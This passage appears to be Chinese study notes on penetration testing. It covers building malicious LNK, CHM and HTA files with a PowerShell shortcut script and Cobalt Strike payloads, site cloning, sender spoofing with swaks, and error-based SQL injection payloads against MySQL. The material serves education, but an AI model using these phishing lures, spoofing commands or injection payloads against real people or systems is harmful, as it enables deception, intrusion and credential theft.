<p><img src="https://pic.imgdb.cn/item/674dcc1dd0e0a243d4dc3773.png"></p>
<ul>
<li>主机上线<ul>
<li>双击运行CHM文件，主机立刻上线</li>
<li>注意问题：运行执行带有powershell命令的CHM文件，屏幕出现闪现一个黑框</li>
</ul>
</li>
</ul>
<h5 id="LNK钓鱼"><a href="#LNK钓鱼" class="headerlink" title="LNK钓鱼"></a>LNK钓鱼</h5><ol>
<li>介绍</li>
</ol>
<ul>
<li>Ink文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。</li>
<li>Ink钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令</li>
</ul>
<ol start="2">
<li>制作方式</li>
</ol>
<ul>
<li>powershell生成图标</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">代码:</span><br><span class="line">$file = Get-Content "test.txt"</span><br><span class="line">$WshShell=New-Object -comObject WScript.Shell</span><br><span class="line">$Shortcut=$WshShell.CreateShortcut("test.Ink")</span><br><span class="line">$Shortcut.TargetPath="%SystemRoot%\system32\cmd.exe"</span><br><span class="line">$Shortcut.lconLocation="%SystemRoot%\System32\Shell32.dll,21</span><br><span class="line">$Shortcut.Arguments =</span><br><span class="line">'+ $file</span><br><span class="line">$Shortcut.Save()</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>在生成图标代码文件夹中建立test.txt文件，文件内容<ul>
<li>cmd /c calc.exe</li>
</ul>
</li>
<li>编译powershell文件内容</li>
<li>执行生成Ink文件，系统将打开计算器</li>
</ul>
<ol start="3">
<li>钓鱼方法</li>
</ol>
<ul>
<li>首先Cobalt Strike生成powershell shell代码</li>
<li>生成方法<ul>
<li>点击菜单attacks-&gt;web Drive by-&gt;scripted web Delivery</li>
<li>弹出的对话框中，type类型设置powershell，单击launch按钮</li>
<li>复制生成代码</li>
<li>将代码替换test.txt中calc.exe内容</li>
<li>重新编译powershell代码</li>
</ul>
</li>
</ul>
<h5 id="HTA钓鱼"><a href="#HTA钓鱼" class="headerlink" title="HTA钓鱼"></a>HTA钓鱼</h5><ol>
<li>介绍</li>
</ol>
<ul>
<li>HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件。</li>
<li>HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多,它具有桌面程序的所有权限。</li>
</ul>
<ol start="2">
<li>CS生成HTA文件</li>
</ol>
<ul>
<li>点击attacks-&gt;packages-&gt;HTML Application</li>
<li>弹出的对话框中method选择powershel点击generate</li>
<li>弹出的窗口中选择保存位置，单击确定</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674dceb0d0e0a243d4dc37fd.png"></p>
<h4 id="3-14-网站克隆和钓鱼邮件"><a href="#3-14-网站克隆和钓鱼邮件" class="headerlink" title="3.14 网站克隆和钓鱼邮件"></a>3.14 网站克隆和钓鱼邮件</h4><h5 id="网站克隆"><a href="#网站克隆" class="headerlink" title="网站克隆"></a>网站克隆</h5><ul>
<li>复制目标网站前端信息</li>
<li>构建相似网页</li>
<li>获取用户登录数据</li>
</ul>
<ol>
<li>方法</li>
</ol>
<ul>
<li>cotalt strike 能够快速复制目标网站前端页面，并且复制相识度极高</li>
<li>cotalt strike 同时还可以在复制的网站中插入恶意代码，如果本地浏览器带有漏洞的用户，可以直接控制目标机器</li>
</ul>
<ol start="2">
<li>过程</li>
</ol>
<ul>
<li>点击cobalt strike 主页面Attack-&gt;Web Drive-by-&gt;Clone File</li>
<li>Clone URL：克隆目标网站的URL</li>
</ul>
<p>注意问题：URL需要添加http协议和端口(80)</p>
<ul>
<li>Local URL：本地克隆路径</li>
<li>Local Host：本地主机IP</li>
<li>Local Port：本地端口</li>
<li>Attack：克隆后目标网站执行脚本，如：flash漏洞</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674dd012d0e0a243d4dc382f.png"></p>
<p><img src="https://pic.imgdb.cn/item/674dd06fd0e0a243d4dc3838.png"></p>
<h5 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h5><ol>
<li>介绍</li>
</ol>
<ul>
<li>钓鱼邮件指利用<strong>伪装</strong>的电邮，<strong>欺骗</strong>收件人将账号、口令等信息回复给指定的接收者;或引导收件人连接到特制的网页，这些网页通常会伪装成和真实网站一样，如银行或理财的网页，令登录者信以为真，输入信用卡或银行卡号码、账户名称及密码等而被盗取</li>
</ul>
<ol start="2">
<li>方法</li>
</ol>
<ul>
<li><p>swaks(SWiss Army Knife Smtp) SMTP瑞士军刀</p>
<ul>
<li>Swaks是由John Jetmore编写和维护的一种功能强大，灵活，可脚本化，面向事务的SMTP测试工具。可向任意目标发送任意内容的邮件</li>
<li>kali自带</li>
<li>官方网站:<a target="_blank" rel="noopener" href="http://wwwjetmore.org/john/code/swaks">http://wwwjetmore.org/john/code/swaks</a></li>
</ul>
</li>
<li><p>swaks -to <a href="mailto:xxx@gq.com">xxx@gq.com</a> 测试邮箱连通性</p>
<ul>
<li>可以成功发送，但是会被550拦截掉，因为怀疑该邮件大量伪造邮件</li>
</ul>
</li>
<li><p>更换伪造方法</p>
<ul>
<li>swaks –to <a href="mailto:xxxx@qq.com">xxxx@qq.com</a> –from <a href="mailto:xxx@126.cn">xxx@126.cn</a> –ehlo <a target="_blank" rel="noopener" href="http://www.126.com/">www.126.com</a> –body welcome MissGun –header “Subject: welcome”<ul>
<li>– to	收件人</li>
<li>–from  发件人</li>
<li>– ehlo  伪造邮件ehlo头</li>
<li>– body  发送正文</li>
<li>–header 邮件头信息 subject:邮件标题</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674dd27fd0e0a243d4dc3861.png"></p>
<ol start="3">
<li>高级用法</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/674dd2cbd0e0a243d4dc3867.png"></p>
<ul>
<li>swaks –data email.txt –to <a href="mailto:xxx@qq.com">xxx@qq.com</a>  –from <a href="mailto:xx@163.cn">xx@163.cn</a><ul>
<li>–data 表示邮件原文</li>
<li>原文中的Received 可以去掉 可以用– from 代替</li>
<li>原文中的To 也可以去掉，可以用–to代替</li>
</ul>
</li>
</ul>
<ol start="4">
<li>小结</li>
</ol>
<ul>
<li>通过邮件伪造可以发送任意内容，如:重置连接，木马等</li>
<li>结合网站克隆制作钓鱼网页来进行高级钓鱼策略</li>
</ul>
<h2 id="第四章-Web安全漏洞原理与验证"><a href="#第四章-Web安全漏洞原理与验证" class="headerlink" title="第四章 Web安全漏洞原理与验证"></a>第四章 Web安全漏洞原理与验证</h2><h3 id="第一部分-Web安全综述"><a href="#第一部分-Web安全综述" class="headerlink" title="第一部分 Web安全综述"></a>第一部分 Web安全综述</h3><h3 id="第二部分-HTTP协议基础"><a href="#第二部分-HTTP协议基础" class="headerlink" title="第二部分 HTTP协议基础"></a>第二部分 HTTP协议基础</h3><h3 id="第三部分-SQL注入漏洞原理与验证"><a href="#第三部分-SQL注入漏洞原理与验证" class="headerlink" title="第三部分 SQL注入漏洞原理与验证"></a>第三部分 SQL注入漏洞原理与验证</h3><h4 id="4-3-1-数据库基础"><a href="#4-3-1-数据库基础" class="headerlink" title="4.3.1 数据库基础"></a>4.3.1 数据库基础</h4><h5 id="数据库概述"><a href="#数据库概述" class="headerlink" title="数据库概述"></a>数据库概述</h5><ul>
<li>数据库(DataBase，<strong>DB</strong>)：存储在磁带、磁盘、光盘或其他外存介质上、按一定结构组织在一起的相关数据的集合。</li>
<li>数据库管理系统(DataBase Management System，<strong>DBMS</strong>)：一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库。例如<strong>MySQL</strong>等类型</li>
<li>数据库系统(DataBase System，<strong>DBS</strong>):通常由软件、数据库(DB)和数据库管理员组成。软件主要包括操作系统、各种宿主语言、实用程序以及数据库管理系统(DBMS)</li>
<li>数据库(DB)由数据库管理系统(DBMS)统一管理，数据的插入、修改和检索均要通过数据库管理系统(DBMS)进行。数据库管理员负责创建、监控和维护整个数据库，使数据能被任何有权使用的人有效使用。</li>
</ul>
<ol>
<li>典型的网站体系结构</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/674ed6bcd0e0a243d4dcadd2.png"></p>
<ol start="2">
<li>数据库分类</li>
</ol>
<ul>
<li><p>关系型数据库</p>
<ul>
<li>关系型数据库模型是把复杂的数据结构归结为简单的二元关系(即二维表格形式)。通过SQL结构化查询语句存储数据，保持数据一致性，遵循ACID理论。</li>
<li>关系型数据库的典型产品:MySQL、Microsoft SQL Server、Oracle、PostgreSQL、IBM DB2、Access等</li>
</ul>
</li>
<li><p>非关系型数据库</p>
<ul>
<li>非关系型数据库也被成为<strong>NOSQL</strong>数据库，NOSQL的本意是“Not Only SQL’指的是非关系型数据库，而不是“NO SQL”的意思。因此，NOSQL的产生并不是要彻底地否定关系型数据库，而是作为传统关系型数据库的一个有效补充。NOSQL数据库在特定的场景下可以发挥出难以想象的高效率和高性能</li>
<li>非关系型数据库的典型产品:Memcached、<strong>Redis</strong>、<strong>mongoDB</strong>等</li>
</ul>
</li>
</ul>
<ol start="3">
<li>ACID理论</li>
</ol>
<ul>
<li>原子性(Atomicity):事务是一个不可分割的单位，事务中的操作要么都发生，要么都不发生。</li>
<li>一致性(Consistency):事务前后数据的完整性必须保持一致。</li>
<li>隔离性(lsolation):多个用户并发访问数据库时，数据库为每一个用户开启的事务，不能被其他事务的操作数据所干扰，多个并发事务之间要相互隔离。</li>
<li>持久性(Durability):一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来即使数据库发生故障也不应该对其有任何影响。</li>
</ul>
<h6 id="主流数据库管理系统"><a href="#主流数据库管理系统" class="headerlink" title="主流数据库管理系统"></a>主流数据库管理系统</h6><ol>
<li>Oracle</li>
</ol>
<ul>
<li>甲骨文公司的一款关系型数据库管理系统。它是在数据库领域一直处于领先地位的产品。可以说Oracle是目前世界上功能最强大、最复杂、市场占比最高的商业数据库产品，适用于各类大、中、小、微机环境。它是一种高效率、**<u>可靠性好的适应高吞吐量</u>**的数据库解决方案。</li>
<li>从架构到运维，可以说是最难的数据库，学习和使用难度较高。</li>
</ul>
<ol start="2">
<li>MySQL</li>
</ol>
<ul>
<li>MySQL是当今最受欢迎的开源SQL数据库管理系统，它由瑞典MySQLAB开发、发布和支持。MySQL AB是一家基于MySQL开发人员的商业公司，它是一家使用了一种成功的商业模式来结合开源价值和方法论的第二代开源公司。</li>
<li>MySQL是现在非常流行的关系型数据库管理系统，尤其在**<u>Web应用方面</u>**，是最好的关系型数据库管理系统应用软件之一。</li>
</ul>
<ol start="3">
<li>Microsoft sQL Server(MssQL)</li>
</ol>
<ul>
<li>SQL Server 是Microsoft推出的关系型数据库管理系统，具有使用方便**<u>可伸缩性好与相关软件集成程度高</u>**等优点，从旧版本的个人电脑到运行Microsoft Windows server 的大型多处理器的服务器都可以使用,</li>
<li>老版本只能在Windows上运行，从SQLServer2017版本起可以在Linux上运</li>
</ul>
<ol start="4">
<li>PostgresQL</li>
</ol>
<ul>
<li>PostgreSQL是加州大学伯克利分校计算机系开发的开源对象关系型数据库管理系统(ORDBMS)，**<u>稳定性极强，用于安全地存储数据</u>**</li>
</ul>
<ol start="5">
<li>Memcached</li>
</ol>
<ul>
<li>Memcached是一个开源的、高性能的、具有分布式内存对象的<strong>缓存系统</strong>。通过它<u><strong>可以减轻数据库负载，加速动态的Web应用</strong></u>。目前全球有非常多的用户都在使用它来架构主机的大负载网站或提升主机的高访问网站的响应速度</li>
<li>Memcached是一种纯内存缓存系统，把经常存取的对象或数据缓存在Memcached的内存中，这些缓存的数据被程序通过API的方式进行读取，Memcached里面的数据就像一张巨大的hash表，数据以<strong>key-value对</strong>的方式存在</li>
</ul>
<ol start="6">
<li>Redis</li>
</ol>
<ul>
<li>Redis也是一个key-value型存储系统。但Redis支持的存储value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集合)等。这些数据类型都支持push/pop、add/remove及取交集、并集和差集及更丰富的操作。</li>
</ul>
<ol start="7">
<li>mongoDB</li>
</ol>
<ul>
<li>mongoDB是一个基于分布式文件存储的数据库，由C++语言编写，旨在为Web应用提供可扩展的高性能数据存储解决方案。</li>
<li>mongoDB是一个<strong>介于关系型数据库和非关系型数据库之间</strong>的产品，是非关系型数据库当中功能最丰富，最像关系型数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。</li>
<li>mongoDB最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。</li>
</ul>
<h6 id="国内自主研发的关系型数据库"><a href="#国内自主研发的关系型数据库" class="headerlink" title="国内自主研发的关系型数据库"></a>国内自主研发的关系型数据库</h6><ul>
<li>达梦(DM)：由华中理工冯玉才教授创办，完全自主研发，以Oracle为参照、追赶对象。</li>
<li>人大金仓(Kingbase)：由人民大学王珊教授创办，自主研发。普通的关系型数据库。</li>
<li>神舟通用(OSCAR)：神舟集团与南大通用合作开发的关系型数据库，更多地用于数据分析领域。</li>
<li>南大通用(GBase)：南开大学的背景，2010年左右自主研发的基于列式存储、面向数据分析、数据仓库的数据库系统。</li>
</ul>
<h6 id="MYSQL数据库连接方式"><a href="#MYSQL数据库连接方式" class="headerlink" title="MYSQL数据库连接方式"></a>MYSQL数据库连接方式</h6><ul>
<li>命令行连接：[root@host]#mysql -h XXXX-u root -p</li>
<li>PHP脚本连接:mysqli_connect(host,username,password,dbname,port,socket);</li>
<li>第三方软件连接</li>
</ul>
<h5 id="识别数据库"><a href="#识别数据库" class="headerlink" title="识别数据库"></a>识别数据库</h5><h6 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h6><ul>
<li>盲跟踪<ul>
<li>Web应用技术</li>
<li>不同数据库SQL语句差异</li>
</ul>
</li>
<li>非盲跟踪<ul>
<li>报错、直接查询</li>
</ul>
</li>
</ul>
<h6 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h6><ol>
<li>默认端口号</li>
</ol>
<ul>
<li>Oracle:1521</li>
<li>MySQL:3306</li>
<li>SQL Server:1433</li>
<li>PostgresQL: 5432</li>
<li>mongoDB:27017</li>
<li>Redis:6379</li>
<li>MemcacheDB:11211</li>
</ul>
<ol start="2">
<li>报错信息</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/674edf11d0e0a243d4dcb6eb.png"></p>
<ol start="3">
<li>各数据库的版本查询方法区别</li>
</ol>
<ul>
<li><p>MSSQL	select @@version		只可以运行这条就为MSSQL</p>
</li>
<li><p>MySQL    select version() / select @@version	两条都能运行就为MySQL</p>
</li>
<li><p>Oracle     select banner from v$version	只可以运行这条就为Oracle</p>
</li>
<li><p>PostgreSQL     select version()	只可以运行这条就为PostgreSQL</p>
</li>
</ul>
<ol start="4">
<li>各数据库在字符串处理时的区别</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/674ee0cad0e0a243d4dcba50.png"></p>
<ol start="5">
<li>各数据库与网页编程语言的搭配</li>
</ol>
<p>常见的搭配:</p>
<ul>
<li>ASP和.NET: Microsoft SQL Server</li>
<li>PHP: MySQL、PostgreSQL</li>
<li>Java: Oracle、MySQL</li>
</ul>
<h5 id="SQL语句基础"><a href="#SQL语句基础" class="headerlink" title="SQL语句基础"></a>SQL语句基础</h5><p><img src="https://pic.imgdb.cn/item/674ee1afd0e0a243d4dcbc01.png"></p>
<ol>
<li>用于与关系型数据库交互的标准 SQL 命令有</li>
</ol>
<ul>
<li>CREATE、SELECT、INSERT、 UPDATE、DELETE 和DROP</li>
<li>分为三组<ul>
<li>数据定义(Create、Drop)</li>
<li>数据操纵(Select、Insert、Update、Delete)</li>
<li>数据控制(Grant、Revoke)</li>
</ul>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674ee2afd0e0a243d4dcbdac.png"></p>
<ol start="2">
<li>高级操作</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/674ee578d0e0a243d4dcc22f.png"></p>
<p><img src="https://pic.imgdb.cn/item/674ee786d0e0a243d4dcc670.png"></p>
<p>order by 3：按照第3列排序</p>
<p>超出列数，报错</p>
<p><img src="https://pic.imgdb.cn/item/674ee706d0e0a243d4dcc54d.png"></p>
<p><img src="https://pic.imgdb.cn/item/674ee7cdd0e0a243d4dcc719.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f1476d0e0a243d4dcde5e.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f17fcd0e0a243d4dcdf27.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f1819d0e0a243d4dcdf2c.png"></p>
<ul>
<li><p>union select 查询到结果会直接拼接到查询结果的下面</p>
</li>
<li><p>前面的select的字段数要和后面union select的字段数相同</p>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674f1a88d0e0a243d4dcdfa8.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f1aabd0e0a243d4dcdfb0.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f1adbd0e0a243d4dcdfbb.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f1bcad0e0a243d4dcdfe9.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f1bded0e0a243d4dcdfeb.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f1cadd0e0a243d4dcdffe.png"></p>
<h4 id="4-3-2-SQL注入漏洞利用"><a href="#4-3-2-SQL注入漏洞利用" class="headerlink" title="4.3.2 SQL注入漏洞利用"></a>4.3.2 SQL注入漏洞利用</h4><h5 id="SQL注入概述"><a href="#SQL注入概述" class="headerlink" title="SQL注入概述"></a>SQL注入概述</h5><p>​		攻击者利用Web应用程序对用户输入验证上的疏忽，在输入的数据中包含对某些数据库系统有特殊意义的符号或命令，让攻击者有机会直接对后台数据库系统下达指令，进而实现对后台数据库乃至整个应用系统的入侵</p>
<ol>
<li>SQL注入原理</li>
</ol>
<p>​		服务端没有过滤用户输入的恶意数据，直接把用户输入的数据当做SQL语句执行，从而影响数据库安全和平台安全。</p>
<ul>
<li>两个条件<ul>
<li>用户能够控制输入</li>
<li>原本程序要执行的SQL语句，拼接了用户输入的恶意数据</li>
</ul>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674f1ec7d0e0a243d4dce08a.png"></p>
<ol start="2">
<li>SQL注入带来的危害</li>
</ol>
<ul>
<li>绕过登录验证：使用万能密码登录网站后台等</li>
<li>获取敏感数据：获取网站管理员帐号、密码等</li>
<li>文件系统操作：列目录，读取、写入文件等</li>
<li>注册表操作：读取、写入、删除注册表等</li>
<li>执行系统命令：远程执行命令</li>
</ul>
<ol start="3">
<li>万能密码</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/674f1f79d0e0a243d4dce0af.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f2065d0e0a243d4dce0cb.png"></p>
<h5 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h5><ol>
<li>按照注入点类型分类</li>
</ol>
<ul>
<li><p>数字型(整型)注入</p>
</li>
<li><p>字符型注入</p>
</li>
<li><p>搜索型注入</p>
</li>
<li><p>数字型(整型)注入</p>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674f211cd0e0a243d4dce0ef.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f2265d0e0a243d4dce117.png"></p>
<ul>
<li>字符型注入</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674f2244d0e0a243d4dce114.png"></p>
<p><img src="https://pic.imgdb.cn/item/674f2328d0e0a243d4dce132.png"></p>
<ul>
<li>搜索型注入</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674f234ad0e0a243d4dce137.png"></p>
<ol start="2">
<li>按照注入技术(执行效果)分类</li>
</ol>
<ul>
<li>基于布尔的盲注<ul>
<li>可以根据返回页面判断条件真假的注入</li>
</ul>
</li>
<li>基于时间的盲注<ul>
<li>不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断</li>
</ul>
</li>
<li>基于报错的注入<ul>
<li>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</li>
</ul>
</li>
<li>联合查询注入<ul>
<li>可以使用union的情况下的注入</li>
</ul>
</li>
<li>堆查询注入<ul>
<li>同时执行多条语句的注入</li>
</ul>
</li>
</ul>
<h5 id="SQL注入漏洞形成的原因"><a href="#SQL注入漏洞形成的原因" class="headerlink" title="SQL注入漏洞形成的原因"></a>SQL注入漏洞形成的原因</h5><ol>
<li>动态字符串构建引起</li>
</ol>
<ul>
<li>不正确的处理转义字符(宽字节注入)：数据库为GBK编码为两个字节，%df和\刚好两字节组成一个汉字，可以吞掉转义闭合符的’’\‘’</li>
<li>不正确的处理错误(报错泄露信息)</li>
<li>不正确的处理联合查询</li>
<li>不正确的处理多次提交(二次注入)</li>
</ul>
<ol start="2">
<li>后台存在的问题</li>
</ol>
<ul>
<li>后台无过滤或者编码用户数据</li>
<li>数据库可以拼接用户传递的恶意代码</li>
</ul>
<ol start="3">
<li>错误处理不当</li>
</ol>
<ul>
<li>详细的内部错误消息显示给用户或攻击者</li>
<li>错误信息可以直接给攻击者提供下一步攻击帮助</li>
</ul>
<ol start="4">
<li>不安全的数据库配置</li>
</ol>
<ul>
<li><p>默认账户:<br>  SQL Server “sa” 作为数据库系统管理员账户;		<strong>默认账户名不可修改</strong><br>  MySQL使用 “root” 和 “anonymous” 用户账户;<br>  Oracle则在创建数据库时通常默认会创建SYS、SYSTEMS DBSNMP和OUTLN账户</p>
</li>
<li><p>权限<br>  问题:系统和数据库管理员在安装数据库服务器时允许以roots SYSTEM或Administrator特<br>  权系统用户账户身份执行操作。<br>  正确方法:应该始终以普通用户身份运行服务器上的服务，降低用户权限，将用户权限只限于<br>  本服务。</p>
</li>
</ul>
<h5 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h5><ol>
<li>GET</li>
</ol>
<ul>
<li>GET方法<ul>
<li>一种请求服务器的HTTP方法，使用该方法时，信息包含在URL中</li>
<li>点击一个链接时，一般会使用该方法</li>
</ul>
</li>
<li>GET请求方法的格式<br>  ?text=value1&amp;cat=value2&amp;num=value3..</li>
<li>修改方法<ul>
<li>浏览器的导航栏中直接修改即可操纵这些参数</li>
<li>HackBar插件</li>
</ul>
</li>
</ul>
<ol start="2">
<li>POST</li>
</ol>
<ul>
<li><p>POST是一种用于向Web服务器发送信息的HTTP方法</p>
</li>
<li><p>数据信息无法在URL中看到</p>
</li>
<li><p>可以发送字节大的数据</p>
</li>
<li><p>修改POST包方法</p>
<ul>
<li>浏览器修改扩展(Hackbar)</li>
<li>代理服务器(Burpsuite)</li>
</ul>
</li>
</ul>
<ol start="3">
<li>其它注入点数据</li>
</ol>
<ul>
<li>Cookie</li>
<li>Host</li>
<li>User-Agent</li>
</ul>
<h5 id="SQL注入的过程"><a href="#SQL注入的过程" class="headerlink" title="SQL注入的过程"></a>SQL注入的过程</h5><ol>
<li>手工注入过程</li>
</ol>
<p>（1）判断是否存在注入点<br>（2）判断字段长度(字段数)<br>（3）判断字段回显位置<br>（4）判断数据库信息<br>（5）查找数据库名<br>（6）查找数据库表<br>（7）查找数据库表中所有字段以及字段<br>（8）猜解账号密码<br>（9）登录管理员后台。</p>
<ol start="2">
<li>自动化注入工具</li>
</ol>
<p>（1）SQL注入工具</p>
<ul>
<li>Sqlmap	</li>
<li>Havij	</li>
<li>sqlid</li>
</ul>
<p>（2）ASP/JSP注入工具</p>
<ul>
<li>NBSI	</li>
<li>阿D注入软件	</li>
<li>明小子注入软件</li>
</ul>
<p>（3）PHP注入工具</p>
<ul>
<li>海阳顶端注入软件</li>
<li>穿山甲注入软件</li>
</ul>
<h4 id="4-3-3-SQL报错注入"><a href="#4-3-3-SQL报错注入" class="headerlink" title="4.3.3 SQL报错注入"></a>4.3.3 SQL报错注入</h4><h5 id="SQL报错注入概述"><a href="#SQL报错注入概述" class="headerlink" title="SQL报错注入概述"></a>SQL报错注入概述</h5><ol>
<li>报错注入</li>
</ol>
<p>​		通过构造特定的SQL语句，让攻击者想要査询的信息(如数据库名、版本号、用户名等)通过页面的错误提示回显出来</p>
<ol start="2">
<li>报错注入的前提条件</li>
</ol>
<ul>
<li>Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上</li>
<li>后台未对一些具有报错功能的函数(如extractvalue、updatexml等)进行过滤</li>
</ul>
<img src="https://pic.imgdb.cn/item/67510a3cd0e0a243d4dda4b9.png" style="zoom:67%;">

<p>上图为数据库报错函数，extractvalue、updatexml的报错信息，可以通过mysql_error函数显示出来</p>
<ol start="3">
<li>有报错功能的函数</li>
</ol>
<ul>
<li><p>Xpath类型函数	(MySQL数据库版本号&gt;=5.1.5)</p>
<ul>
<li><p><u><strong>extractvalue()</strong></u></p>
<ul>
<li>作用：<strong>对XML文档进行查询</strong>，相当于在HTML文件中用标签查找元素。</li>
<li>语法：extractvalue(XML_document, XPath_string )<br>      参数1：XML_document是String格式，为XML文档对象的名称<br>      参数2：<strong>XPath_string</strong>(Xpath格式的字符串)，注入时可操作的地方</li>
<li>报错原理：xml文档中查找字符位置是用 /xxx/xxx/xxx/..这种格式，如果写入其他格式就会报错，并且会返回写入的非法格式内容，错误信息如：<strong>XPATH syntax error</strong>:’xxxxxxxx’</li>
<li>实例<br>  mysql&gt; select <u>extractvalue</u>(1,concat(‘<del>‘,<strong>user()</strong>));<br>  ERROR 1105 (HY000):XPATH syntax error:’</del><strong>root@localhost</strong>‘</li>
<li>注：该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</li>
</ul>
</li>
<li><p><u><strong>updatexml()</strong></u></p>
<ul>
<li>作用：<strong>改变文档中符合条件的节点的值</strong>。</li>
<li>语法：updatexml( XML_document, XPath_string, new_value )<br>      参数1：XML_document是String格式，为XML文档对象的名称<br>      参数2：<strong>XPath_string</strong> (Xpath格式的字符串)，注入时可操作的地方<br>      参数3：new_value，String格式，替换查找到的符合条件的数据</li>
<li>报错原理：同extractvalue()</li>
<li>实例<br>  mysql&gt; select <u>updatexml</u>(1,concat(‘<del>‘,<strong>user()</strong>),1);<br>  ERROR 1105 (HY000)：XPATH syntax error:’</del><strong>root@localhost</strong>‘</li>
<li>注：该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</li>
</ul>
</li>
</ul>
</li>
<li><p>其他函数</p>
<ul>
<li><u><strong>floor()、rand()、count()、group by联用</strong></u><ul>
<li>作用<ul>
<li>floor(x)：对参数x向下取整</li>
<li>rand()：生成一个0~1之间的随机浮点数</li>
<li>count(*)：统计某个表下总共有多少条记录*</li>
<li>group by x：按照(by)一定的规则(x)进行分组</li>
</ul>
</li>
<li>报错原理：qroup by与rand()使用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由qroup by将计算出来的主键直接插入到临时表格中，导致<strong>主键重复报错</strong>，错误信息如：<strong>Duplicate entry</strong> ‘… ‘<strong>for key’group key’</strong><br>  (参考资料:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/8472323.html">https://www.cnblogs.com/litlife/p/8472323.html</a>)</li>
<li>实例<br>  mysql&gt; select 1 from (select count(*),concat(<strong>user()</strong>,floor(rand(0)*2))x from information_schema.tables group by x)a;<br>  ERROR 1062 (23000): Duplicate entry ‘<strong>root@localhost</strong>1’ for key ‘group key’</li>
</ul>
</li>
<li><strong><u>exp()</u></strong>       (5.5.5&lt;= MySQL数据库版本号 &lt;=5.5.49)<ul>
<li>作用：计算以e(自然常数)为底的幂值</li>
<li>语法：exp(x)</li>
<li>报错原理:当参数x超过710时，exp()函数会报错，错误信息如：<strong>DOUBLE value is out of range</strong>:<br>  ……</li>
<li>实例<br>  mysql&gt; select <u>exp</u>(<del>(select * from (select <strong>user()</strong>) as x));<br>  ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(</del>((select ‘<strong>root@localhost</strong>‘ from dual)</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/67511433d0e0a243d4ddb678.png"></p>
<h5 id="SQL报错注入实例"><a href="#SQL报错注入实例" class="headerlink" title="SQL报错注入实例"></a>SQL报错注入实例</h5><p><img src="https://pic.imgdb.cn/item/67511486d0e0a243d4ddb708.png"></p>
<p><img src="https://pic.imgdb.cn/item/67511947d0e0a243d4ddbcec.png"></p>
<p><img src="https://pic.imgdb.cn/item/675119d6d0e0a243d4ddbd78.png"></p>
<h4 id="4-3-4-SQL盲注"><a href="#4-3-4-SQL盲注" class="headerlink" title="4.3.4 SQL盲注"></a>4.3.4 SQL盲注</h4><h5 id="SQL盲注概述"><a href="#SQL盲注概述" class="headerlink" title="SQL盲注概述"></a>SQL盲注概述</h5><ol>
<li>盲注</li>
</ol>
<ul>
<li>在SQL注入过程中，SQL语句执行后，选择的数据<strong>不能回显</strong>到前端页面，此时需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</li>
<li>在盲注中，攻击者根据其返回页面的不同来判断信息(可能是页面内容的不同，也可以是响应时间不同)。一般情况下，盲注可分为两类:<ul>
<li>基于布尔的盲注(Boolean based)</li>
<li>基于时间的盲注(Time based)</li>
</ul>
</li>
</ul>
<ol start="2">
<li>盲注分为两种</li>
</ol>
<ul>
<li>基于布尔的盲注<br>  某些场合下，页面返回的结果只有两种(正常或错误)。通过构造SQL判断语句，查看页面的返回结果(True or False)来判断哪些SQL判断条件成立，通过此来获取数据库中的数据。</li>
